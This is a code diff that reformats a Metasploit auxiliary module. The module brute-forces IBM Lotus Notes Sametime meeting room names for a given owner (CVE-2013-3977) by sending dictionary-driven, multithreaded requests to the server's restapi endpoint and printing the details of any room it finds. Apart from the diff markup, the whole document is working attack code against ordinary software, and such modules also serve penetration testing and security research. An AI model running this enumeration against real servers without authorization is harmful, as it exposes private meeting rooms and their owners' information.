@@ -1,54 +1,54 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 require 'enumerable'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'IBM Lotus Notes Sametime Room Name Bruteforce',
-      'Description'    => %q{
-        This module bruteforces Sametime meeting room names via the IBM
-        Lotus Notes Sametime web interface.
-      },
-      'Author'         =>
-        [
-          'kicks4kittens' # Metasploit module
-        ],
-      'References' =>
-        [
-          [ 'CVE', '2013-3977' ],
-          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21671201']
-        ],
-      'DefaultOptions' =>
-        {
-          'SSL' => true
-        },
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => 'Dec 27 2013'
-    ))
+                      'Name'           => 'IBM Lotus Notes Sametime Room Name Bruteforce',
+                      'Description'    => %q(
+                        This module bruteforces Sametime meeting room names via the IBM
+                        Lotus Notes Sametime web interface.
+                      ),
+                      'Author' =>
+                        [
+                          'kicks4kittens' # Metasploit module
+                        ],
+                      'References' =>
+                        [
+                          [ 'CVE', '2013-3977' ],
+                          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21671201']
+                        ],
+                      'DefaultOptions' =>
+                        {
+                          'SSL' => true
+                        },
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => 'Dec 27 2013'))
 
     register_options(
       [
         Opt::RPORT(443),
-        OptString.new('OWNER', [ true,  'The owner to bruteforce meeting room names for', '']),
+        OptString.new('OWNER', [ true, 'The owner to bruteforce meeting room names for', '']),
         OptPath.new('DICT', [ true,  'The path to the userinfo script' ]),
         OptString.new('TARGETURI', [ true, 'Path to stmeetings', '/stmeetings/'])
-      ], self.class)
+      ], self.class
+    )
 
     register_advanced_options(
       [
-        OptInt.new('TIMING', [ true,  'Set pause between requests', 0]),
-        OptInt.new('Threads', [ true,  'Number of test threads', 10])
-      ], self.class)
+        OptInt.new('TIMING', [ true, 'Set pause between requests', 0]),
+        OptInt.new('Threads', [ true, 'Number of test threads', 10])
+      ], self.class
+    )
   end
 
   def run
@@ -60,22 +60,20 @@ class MetasploitModule < Msf::Auxiliary
     uri = target_uri.path
     @reqpath = normalize_uri(uri, '/restapi')
 
-    res = send_request_cgi({
-      'uri'     =>  @reqpath,
-      'method'  => 'GET',
-      'ctype'   => 'text/html',
-      'vars_get' => {
-        'owner' => datastore['OWNER'],
-        'permaName' => rval
-        }
-    })
+    res = send_request_cgi('uri' => @reqpath,
+                           'method'  => 'GET',
+                           'ctype'   => 'text/html',
+                           'vars_get' => {
+                             'owner' => datastore['OWNER'],
+                             'permaName' => rval
+                           })
 
     unless res
       print_error("No response, timeout")
       return
     end
 
-    if res.code == 404 and res.body =~ /Room does not exist/i
+    if (res.code == 404) && res.body =~ /Room does not exist/i
       vprint_status("Server responding to restapi requests as expected")
     else
       print_error("Unexpected response from server (#{res.code}). Exiting...")
@@ -92,7 +90,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Beginning dictionary bruteforce using (#{datastore['Threads']} Threads)")
 
-    while(not @test_queue.empty?)
+    until @test_queue.empty?
       t = []
       nt = datastore['Threads'].to_i
       nt = 1 if nt <= 0
@@ -104,12 +102,12 @@ class MetasploitModule < Msf::Auxiliary
 
       begin
         1.upto(nt) do
-          t << framework.threads.spawn("Module(#{self.refname})-#{rhost}", false, @test_queue.shift) do |test_current|
-            Thread.current.kill if not test_current
+          t << framework.threads.spawn("Module(#{refname})-#{rhost}", false, @test_queue.shift) do |test_current|
+            Thread.current.kill unless test_current
             res = make_request(test_current)
             if res.nil?
               print_error("Timeout from server when testing room \"#{test_current}\"")
-            elsif res and res.code == 404
+            elsif res && (res.code == 404)
               vprint_status("Room \"#{test_current}\" was not valid for owner #{datastore['OWNER']}")
             else
               # check response for user data
@@ -117,11 +115,17 @@ class MetasploitModule < Msf::Auxiliary
             end
           end
         end
-      t.each {|x| x.join }
+        t.each(&:join)
 
       rescue ::Timeout::Error
       ensure
-        t.each {|x| x.kill rescue nil }
+        t.each do |x|
+          begin
+                      x.kill
+                    rescue
+                      nil
+                    end
+        end
       end
     end
   end
@@ -129,20 +133,16 @@ class MetasploitModule < Msf::Auxiliary
   # make request and return response
   def make_request(test_current)
     # Apply timing information
-    if datastore['TIMING'] > 0
-      Rex::sleep(datastore['TIMING'])
-    end
+    Rex.sleep(datastore['TIMING']) if datastore['TIMING'] > 0
 
-    res = send_request_cgi({
-      'uri'     =>  @reqpath,
-      'method'  => 'GET',
-      'ctype'   => 'text/html',
-      'vars_get' =>
+    res = send_request_cgi('uri' => @reqpath,
+                           'method'  => 'GET',
+                           'ctype'   => 'text/html',
+                           'vars_get' =>
         {
           'owner' => datastore['OWNER'],
           'permaName' => test_current
-        }
-    })
+        })
   end
 
   # check the response for valid room information
@@ -160,37 +160,34 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def output_table(room_info, test_current)
-
     print_good("New meeting room found: #{test_current}")
 
     # print output table for discovered meeting rooms
     roomtbl = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
-        'Header'  => "[IBM Lotus Sametime] Meeting Room #{test_current}",
-        'Prefix'  => "",
-        'Postfix' => "\n",
-        'Indent'  => 1,
-        'Columns' =>
-          [
-            "Key",
-            "Value"
-          ]
-      )
+      'Header'  => "[IBM Lotus Sametime] Meeting Room #{test_current}",
+      'Prefix'  => "",
+      'Postfix' => "\n",
+      'Indent'  => 1,
+      'Columns' =>
+        [
+          "Key",
+          "Value"
+        ]
+    )
 
     room_info['results'][0].each do |k, v|
       if v.is_a?(Hash)
         # breakdown Hash
         roomtbl << [ k.to_s, '>>' ] # title line
-        v.each do | subk, subv |
-          roomtbl << [ "#{k.to_s}:#{subk.to_s}", subv.to_s || "-"]  if not v.nil? or v.empty?
+        v.each do |subk, subv|
+          roomtbl << [ "#{k}:#{subk}", subv.to_s || "-"] if !v.nil? || v.empty?
         end
       else
-        roomtbl << [ k.to_s, v.to_s || "-"]  unless v.nil?
+        roomtbl << [ k.to_s, v.to_s || "-"] unless v.nil?
       end
     end
     # output table
     print_good(roomtbl.to_s)
-
   end
-
 end
